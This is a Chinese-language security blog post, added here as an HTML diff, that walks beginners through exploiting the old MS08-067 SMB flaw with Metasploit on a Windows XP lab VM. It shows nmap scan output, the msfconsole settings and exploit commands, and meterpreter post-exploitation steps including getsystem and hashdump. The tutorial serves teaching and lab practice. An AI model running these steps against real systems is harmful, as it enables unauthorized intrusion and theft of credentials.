@@ -1,0 +1,1162 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="description" content="metasploit———-（还原经典ms08-067）虽然这个漏洞比较老套，网上教程也很多，多数的已经修复了这个漏洞。但是比较经典，适用于小白学习，也算是比较简单的一个教程。没什么多大的难度。各位dalao凑合着看看吧！！！！。">
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="经典再现之ms08-067">
+<meta property="og:url" content="www.ggsec.cn/经典再现之ms08-067.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:description" content="metasploit———-（还原经典ms08-067）虽然这个漏洞比较老套，网上教程也很多，多数的已经修复了这个漏洞。但是比较经典，适用于小白学习，也算是比较简单的一个教程。没什么多大的难度。各位dalao凑合着看看吧！！！！。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/4QM_PA1VCHN_FA2@JM702.jpg">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/549D8865-7ACE-4AA6-B731-B8D097A88C82.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/C1BA23BB-8698-4BE5-BF09-CC48D5392177.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/37C57579-B362-4AA4-A897-F183BE9CA2EA.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/1EU17WG7CFIANQQIX.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/OHQ78K1PXVK7720C5.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/BOYSU_V7RZLG4G_VS.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/BOYSU_V7RZLG4G_VS.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/N5P8UM6VC2TTNMUY8.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/QO0TW46ZZMXTXO4U6Y.png">
+<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/11/3PHKWDONJ68WO00S13.png">
+<meta property="og:updated_time" content="2018-12-21T06:55:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="经典再现之ms08-067">
+<meta name="twitter:description" content="metasploit———-（还原经典ms08-067）虽然这个漏洞比较老套，网上教程也很多，多数的已经修复了这个漏洞。但是比较经典，适用于小白学习，也算是比较简单的一个教程。没什么多大的难度。各位dalao凑合着看看吧！！！！。">
+<meta name="twitter:image" content="http://www.secist.com/wp-content/uploads/2016/11/4QM_PA1VCHN_FA2@JM702.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 经典再现之ms08-067 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              经典再现之ms08-067
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2017-01-13T21:26:52+08:00" content="2017-01-13">
+            2017-01-13
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/经典再现之ms08-067.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="经典再现之ms08-067.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/经典再现之ms08-067.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h1>                                metasploit———-（还原经典ms08-067）</h1><br>虽然这个漏洞比较老套，网上教程也很多，多数的已经修复了这个漏洞。但是比较经典，适用于小白学习，也算是比较简单的一个教程。没什么多大的难度。各位dalao凑合着看看吧！！！！。<img class="alignnone size-full wp-image-2181" src="http://www.secist.com/wp-content/uploads/2016/11/4QM_PA1VCHN_FA2@JM702.jpg" alt="4qm_pa1vchn_fa2jm702" width="85" height="91"><br><a id="more"></a><br><h1><span style="color: #ff0000;">知识科普：</span></h1><br><h3></h3><br><h3><strong><span style="color: #008000;"><span style="color: #000000;">Metasploit</span></span></strong></h3><br><h3><strong><span style="color: #008000;">是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。</span></strong></h3><br>&nbsp;<br><h4><span style="color: #ff0000;"><span style="color: #000000;">SMB：</span></span></h4><br><span style="color: #ff0000;">(Server Message Block)是协议名，它能被用于Wap连接和客户端与服务器之间的信息沟通。常用于共享如：打印机，文件传输等等</span><br><br>&nbsp;<br><h4><strong><span style="color: #000000;">ms08-067</span>：</strong></h4><br><span style="color: #008000;">MS08-067漏洞将会影响除Windows <a style="color: #008000;" href="http://baike.baidu.com/view/488131.htm" target="_blank">Server</a> 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pre-Beta。（一款08年的陈年老漏洞，就拿来讲讲，算是给新手小白，科普科普）</span><br><div class="para"><b>说明：</b>微软安全公告KB958644</div><br><div class="para"><b>漏洞影响：</b>服务器服务中的漏洞可能允许远程执行代码</div><br><div class="para"><b>发布日期：</b>2008/10/22</div><br><div class="para"><b>下载大小：</b>因操作系统而异。</div><br><div class="para"><b>受影响的操作系统： </b>Windows 2000;XP;Server 2003;<a href="http://baike.baidu.com/subview/8911/8911.htm" target="_blank">Vista</a>;Server 2008;7 Beta</div><br><div class="para"><br><div class="para"><b>摘要</b></div><br><div class="para">此安全更新解决了服务器服务中一个秘密报告的漏洞。 如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。 防火墙最佳做法和标准的默认防火墙配置有助于保护网络资源免受从企业外部发起的攻击。可以通过安装本 Microsoft 更新程序来保护计算机不受侵害。安装后，可能必须重新启动计算机。</div><br><div class="para"><b>严重等级：</b>Windows 2000;XP;Server 2003为严重，Windows Vista;Server 2008;7 Beta为重要。</div><br></div><br>修复方案：安装官方补丁<br><br>&nbsp;<br><br>下面<strong>请观看视频演示：——–由于以前的视频没有那么详细，后来晚上做重新录制了一份出来，做的不好，还望海涵</strong><br><br><h1><span style="color: #ff0000;">下面是我做的演示视频：</span></h1>
+
+<p> </p><h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink"></a></h1><hr><p></p>
+<p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/11111.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+
+<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28381276&auto=1&height=66"></iframe><br>‘</p>
+<p>&nbsp;</p>
+<p><span style="color: #ff0000;">以下是视频的内容详解，我将用图文来讲解：</span></p>
+<p>&nbsp;</p>
+<p>本次搭建的环境  目标系统  虚拟机 ：<span style="color: #ff0000;">windows  XP SP3（ English）———-WinXPenSP3 是《Metasploit渗透测试魔鬼训练营》里面实验用到的镜像和源代码</span></p>
+<p><span style="color: #008000;"><span style="color: #000000;">目标ip：</span><span style="color: #ff0000;">192.168.1.102</span></span></p>
+<p>msf利用漏洞： <span style="color: #ff0000;"> 445端口（smb服务漏洞ms08–067）</span></p>
+<p><span style="color: #008000;">  </span></p>
+<p>攻击者 系统  ： <span style="color: #008000;">mac os</span></p>
+<p>搭载渗透工具：<span style="color: #008000;"> metasploit</span></p>
+<p>目标ip：<span style="color: #008000;">192.168.1.101</span></p>
+<p>&nbsp;</p>
+<p></p><h1><em><strong><span style="color: #ff0000;">信息收集：</span></strong></em></h1><br>在此之前呢  我们有个疑问？就是如何在不知道的情况下得知目标系统的详细信息呢？<p></p>
+<p>1.那么我们就用到kali下的经典老款神器：<span style="color: #008000;">nmap</span></p>
+<p>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端</p>
+<p>我们用nmap 扫描我们整个IP段：用来得知目标系统的 信息配置，端口，ip等详细信息</p>
+<p>nmap结合实际情况来使用相应的参数，我这边就直接使用：</p>
+<p><span style="color: #008000;">-A     综合扫描</span></p>
+<p><span style="color: #008000;">192.168.1.0/24 内网的整个IP段</span></p>
+<p><pre class="lang:vim decode:true">nmap -A 192.168.1.0/24</pre><br>&nbsp;</p>
+<p>nmap其中的 扫描结果如下：</p>
+<p><pre class="lang:vim decode:true ">Nmap scan report for 192.168.1.102<br>Host is up (0.00066s latency).<br>Not shown: 988 closed ports<br>PORT     STATE SERVICE         VERSION<br>25/tcp   open  smtp            Microsoft ESMTP 6.0.2600.5512<br>| smtp-commands: dh-ca8822ab9589 Hello [192.168.1.108], SIZE 2097152, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK,<br>|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT VRFY<br>80/tcp   open  http            Microsoft IIS httpd 5.1<br>|_http-server-header: Microsoft-IIS/5.1<br>|_http-title: \xD5\xFD\xD4\xDA\xBD\xA8\xC9\xE8\xD6\xD0<br>|_http-webdav-scan: ERROR: Script execution failed (use -d to debug)<br>135/tcp  open  msrpc           Microsoft Windows RPC<br>139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn<br>443/tcp  open  https?<br>445/tcp  open  microsoft-ds    Windows XP microsoft-ds<br>777/tcp  open  multiling-http?<br>1025/tcp open  msrpc           Microsoft Windows RPC<br>3389/tcp open  ms-wbt-server   Microsoft Terminal Service<br>6002/tcp open  http            SafeNet Sentinel Protection Server httpd 7.3<br>|_http-server-header: SentinelProtectionServer/7.3<br>7001/tcp open  afs3-callback?<br>7002/tcp open  http            SafeNet Sentinel Keys License Monitor httpd 1.0 (Java Console)<br>|_http-title: Sentinel Keys License Monitor<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service" target="_blank" rel="noopener">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port777-TCP:V=7.25BETA2%I=7%D=11/16%Time=582C6DC5%P=i686-pc-linux-gnu%r<br>SF:(Kerberos,5,”\x01\0\t\xe0\x06”)%r(SMBProgNeg,5,”\x01\0\t\xe0\x06”)%r(Te<br>SF:rminalServer,A,”\x01\0\t\xe0\x06\x01\0\t\xe0\x06”)%r(WMSRequest,5,”\x01<br>SF:\0\t\xe0\x06”);<br>MAC Address: 00:1C:42:09:90:5A (Parallels)<br>Device type: general purpose<br>Running: Microsoft Windows XP<br>OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3<br>OS details: Microsoft Windows XP SP2 or SP3<br>Network Distance: 1 hop<br>Service Info: Host: dh-ca8822ab9589; OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</pre></p>
+<p>Host script results:<br>|_nbstat: NetBIOS name: DH-CA8822AB9589, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:1c:42:09:90:5a (Parallels)<br>| smb-os-discovery:<br>|   OS: Windows XP (Windows 2000 LAN Manager)<br>|   OS CPE: cpe:/o:microsoft:windows_xp::-<br>|   Computer name: dh-ca8822ab9589<br>|   NetBIOS computer name: DH-CA8822AB9589<br>|   Workgroup: WORKGROUP<br>|_  System time: 2016-11-16T22:33:35+08:00</p>
+<p>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.66 ms 192.168.1.102<br><br>&nbsp;</p>
+<p></p><h1><span style="color: #ff0000;"><strong>metasploit漏洞利用：</strong></span></h1><br>&nbsp;<p></p>
+<p></p><h3><strong>1.接下来打开我们的 metasploit</strong></h3><br>已经知道了ip和服务漏洞就可以用msf来进行使用。<p></p>
+<p>输入第一个命令 <span style="color: #ff0000;">用来寻找ms08-067的模块的位置</span></p>
+<p>找具体的exploit可以受用search命令，search支持几种关键字的查询,对于查找模块的search命令希望了解如何使用，就可以在MSF终端中输入help search，MSF终端将会显示该命令的参数列表，包括每个参数的含义及可能的取值。</p>
+<p>另外值得说的是在新版msf下  使用命令是不区分大小写的，之前老版本是要区分大小的。</p>
+<p><em><strong>search命令的帮助参数如下：</strong></em></p>
+<p><pre class="lang:vim decode:true">msf &gt; help search<br>Usage: search [keywords]</pre></p>
+<p>Keywords:<br>  app       :  Modules that are client or server attacks<br>  author    :  Modules written by this author<br>  bid       :  Modules with a matching Bugtraq ID<br>  cve       :  Modules with a matching CVE ID<br>  edb       :  Modules with a matching Exploit-DB ID<br>  name      :  Modules with a matching descriptive name<br>  platform  :  Modules affecting this platform<br>  ref       :  Modules with a matching ref<br>  type      :  Modules of a specific type (exploit, auxiliary, or post)</p>
+<p>Examples:<br>  search cve:2009 type:exploit app:client<br>&nbsp;</p>
+<p>那么我们就搜索exp的关键字如下：</p>
+<p><pre class="lang:vim decode:true">search ms08-067</pre><br><img class="wp-image-2151 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/549D8865-7ACE-4AA6-B731-B8D097A88C82.png" alt="549d8865-7ace-4aa6-b731-b8d097a88c82" width="681" height="300"></p>
+<p>&nbsp;</p>
+<ol start="2">
+<li>对于找出exp的模块位置,使用<span style="color: #008000;"><strong><span style="color: #ff0000;">use</span></strong><span style="color: #000000;">参数(使用</span>)</span> xxxxx模块，进入ms08-067模块，按住键盘的Tab键，即可补全相应的模块位置：</li>
+</ol>
+<p><img class="size-full wp-image-2152 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/C1BA23BB-8698-4BE5-BF09-CC48D5392177.png" alt="c1ba23bb-8698-4be5-bf09-cc48d5392177" width="613" height="58"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong>3.</strong> 接着我们使用<strong><span style="color: #ff0000;"> show targets</span> </strong>来指定我们的目标系统版本：</p>
+<p><img class="size-full wp-image-2153 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/37C57579-B362-4AA4-A897-F183BE9CA2EA.png" alt="37c57579-b362-4aa4-a897-f183be9ca2ea" width="680" height="358"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong>4：</strong>设置目标系统的版本——由nmap扫描结果得知：系统版本</p>
+<p><pre class="lang:vim decode:true">set  target 7</pre><br>格式为：<span style="color: #ff0000;">set </span>  （设置）   <span style="color: #ff0000;">target  </span> （所受影响的系统版本）  <span style="color: #ff0000;">7</span>（ID —&gt;1~72    系统的序列号）</p>
+<p><img class="size-full wp-image-2173 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/1EU17WG7CFIANQQIX.png" alt="1eu17wg7cfianqqix" width="407" height="143"></p>
+<p>&nbsp;</p>
+<p></p><h4>5.用<span style="color: #ff0000;">show options  </span>或者<span style="color: #ff0000;">options </span> 用来展示设置选项，查看设置选项是否设置对错或者设置成功。</h4><br>&nbsp;<p></p>
+<p>可看到下方的Explolit  target 下栏可看到 已设置完成的选项  （系统版本）</p>
+<p><img class="size-full wp-image-2172 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/OHQ78K1PXVK7720C5.png" alt="ohq78k1pxvk7720c5" width="618" height="417"></p>
+<p><img class="size-full wp-image-2176 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/BOYSU_V7RZLG4G_VS.png" alt="boysu_v7rzlg4g_vs" width="648" height="181"></p>
+<ol start="6">
+<li>填写目标ip ——目标ip由nmap扫描得知<br><pre class="lang:vim decode:true">set  rhost   192.168.1.102 （跟上一个目标的ip地址）</pre><br>接着说上一张图，required 选项栏中，有下方都是yes的选项，这些选项都是必填的，但是有些部分是默认的，我们这里就不动了，只需填写rhost的 目标ip即可。</li>
+</ol>
+<p>填写完之后呢，也可以用show  opinions 来查看设置选项  是否设置成功</p>
+<p>&nbsp;</p>
+<p></p><h4><strong>7.设置本机ip反弹shell，监听端口——我这边就直接设置相应的参数  效果和msf的  exploit/multi/handler效果是一样的</strong></h4><p></p>
+<p><pre class="lang:vim decode:true">set  lhost    192.168.1.101     （设置本机监听的ip）<br>set   lports   4444             （设置本机监听的端口）</pre><br><img class="size-full wp-image-2176 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/BOYSU_V7RZLG4G_VS.png" alt="boysu_v7rzlg4g_vs" width="648" height="181"></p>
+<p></p><h4>8.使用<strong><span style="color: #ff0000;">check</span></strong>命令，来检查是否设置对错，以及检查目标系统是否存在此漏洞</h4><br><img class="size-full wp-image-2177 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/N5P8UM6VC2TTNMUY8.png" alt="n5p8um6vc2ttnmuy8" width="655" height="128"><p></p>
+<p></p><h4><strong>9.检查完后，使用<span style="color: #ff0000;">exploit</span>命令来执行本次攻击，得到了meterpreter 会话，在会话中使用help来查看相应的参数</strong></h4><br><img class="size-full wp-image-2178 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/QO0TW46ZZMXTXO4U6Y.png" alt="qo0tw46zzmxtxo4u6y" width="664" height="171"><p></p>
+<p>下面有几个命令是可以用到的，</p>
+<p></p><p style="padding-left: 60px;"><strong>shell—–反弹cmd会话</strong></p><p></p>
+<p></p><p style="padding-left: 60px;"><strong>sysinfo —–获取目标系统的信息</strong></p><p></p>
+<p></p><p style="padding-left: 60px;"><strong>getuid—-查看当前使用的权限</strong></p><p></p>
+<p></p><p style="padding-left: 60px;"><strong>getsystem —-提升权限为system</strong></p><p></p>
+<p></p><p style="padding-left: 60px;"><strong>hashdump—–获取管理员密码</strong></p><br><img class="size-full wp-image-2179 aligncenter" src="http://www.secist.com/wp-content/uploads/2016/11/3PHKWDONJ68WO00S13.png" alt="3phkwdonj68wo00s13" width="730" height="292"><p></p>
+<p>可更加进一步的提权。</p>
+<p>Demon    2016.11.17 更</p>
+<p>参考资料：<a href="http://www.thinkful.cn/archives/346.html" target="_blank" rel="noopener">http://www.thinkful.cn/archives/346.html</a>    使用Metasploit工具利用微软MS08-067漏洞攻击服务器</p>
+<p><a href="http://baike.baidu.com/link?url=7SNWIRIIXKssagC8YzSxJ3PVL_5Dwr9mv82bbW6kMg0fXC3sPxS_r89dijzh35wlGrxCyQTNVYCycn3DMqT3Yx4VCKbdL41f5WYdDwef5vy" target="_blank" rel="noopener">http://baike.baidu.com/link?url=7SNWIRIIXKssagC8YzSxJ3PVL_5Dwr9mv82bbW6kMg0fXC3sPxS_r89dijzh35wlGrxCyQTNVYCycn3DMqT3Yx4VCKbdL41f5WYdDwef5vy</a>                                  ms08-067 百度</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag">#Metasploit</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Metasploitable-3.html" rel="prev">Metasploitable_3</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/黑苹果3.html" rel="next">黑苹果3</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
